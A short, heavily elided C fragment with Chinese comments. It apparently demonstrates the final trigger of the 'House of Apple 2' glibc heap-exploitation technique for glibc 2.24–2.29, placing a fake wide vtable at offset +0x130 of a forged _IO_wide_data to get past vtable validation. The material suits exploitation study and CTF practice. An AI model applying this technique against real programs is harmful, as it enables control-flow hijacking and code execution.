#define _GNU_SOURCE
/*
 * 手法：House of Apple 2 最终触发点；适用 glibc 2.24～2.29 的 x86-64 旧 codecvt ABI。
 *
 * 旧 `_IO_wide_data` 内嵌较大的 codecvt 函数表，故 `_wide_vtable` 位于
 * +0x130。primary vtable 使用合法 `_IO_wfile_jumps` 通过 2.24 引入的
 * validation，而 `_IO_wdoallocbuf` 对 wide vtable 没有同等白名单检查。
 */
...
int main(void)
{
    ...
    // 旧 ABI 的 `_wide_vtable` 位于 +0x130，因此伪 wide_data 至少覆盖到 +0x138。
    ...
    fake_wide_data[0x130 / 8] = (uintptr_t)fake_wide_vtable;
